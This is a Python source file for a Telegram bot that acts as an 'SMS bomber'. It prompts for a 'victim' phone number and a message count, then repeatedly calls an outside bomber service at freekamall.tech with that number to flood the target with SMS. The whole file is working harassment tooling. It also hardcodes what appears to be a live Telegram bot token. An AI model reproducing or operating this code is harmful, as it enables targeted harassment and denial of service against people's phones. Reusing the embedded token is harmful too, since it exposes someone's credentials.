import telebot
import time
import requests

Bot_Token = "1702684382:AAFUZxoAdNy6TItR5gknWpgj3mj0bLYtvS8"

bot = telebot.TeleBot(Bot_Token, parse_mode=None) # You can set parse_mode by default. HTML or MARKDOWN


user_dict = {}


class User:
    def __init__(self, mobile_number):
        self.mobile_number = mobile_number
        self.count = None


@bot.message_handler(commands=['start','help'])
def send_welcome(message):
    text_to_send= "Wel-Come To Unlimited SMS-Sending Bot !! \n \n This Bot Is Automatically Sending unlimited Number Of Sms No Need To Active On Bot \n \n Just Enter The Victime Number : "
    bot.register_next_step_handler(bot.send_message(message.chat.id , text_to_send), process_mobile_number_step)


def process_mobile_number_step(message):
    try:
        chat_id = message.chat.id
        mobile_number = message.text
        if len(mobile_number) ==10:
            user = User(mobile_number)
            user_dict[chat_id] = user
            msg = bot.reply_to(message, 'How SMS You Want To Send ? \n \n For Example 10 So We Will Send  1 sms in every 60sec So Enter Amount Like 1000 or more so the process will never stop !! \n \n If You Want To Test Just Put 10 ')
            bot.register_next_step_handler(msg, process_count_step)
        else:
            ms=bot.send_message(chat_id, "Please Enter A Valid 10 Digit Mobile Number")
            bot.register_next_step_handler(ms, process_mobile_number_step)
    except Exception as e:
        bot.reply_to(message, 'oooops')



def process_count_step(message):
    try:
        chat_id = message.chat.id
        count = message.text
        user = user_dict[chat_id]
        user.count = count
        ms=bot.send_message(chat_id, 'We Will Start Sending SMS To : ' + user.mobile_number + '\n Count:' + str(user.count)+"\n \n Type 'YES' To Continue Or 'NO' Exit")
        bot.register_next_step_handler(ms, process_sms_step)
    except Exception as e:
        bot.reply_to(message,'oooops')

def process_sms_step(message):
    chat_id = message.chat.id
    check = message.text
    if check == "YES":
        user = user_dict[chat_id]
        for i in range(1,int(user.count)+1):
            pre = 1
            next = 34
            for k in range(pre,next):
                if k == int(user.count):
                    bot.send_message(chat_id,"Process Completed")
                    exit()
                req = requests.get("https://freekamall.tech/sms-bomber/"+str(k)+".php?sent=2&&count=100&&mobno="+user.mobile_number)
                bot.send_message(chat_id,"Sended "+str(k)+" SMS Waiting For 60 Sec ")
                time.sleep(60)
            pre = pre +34 
            next = next+34
    else:
        bot.send_message(chat_id,"Canceled The Proccess")

bot.polling()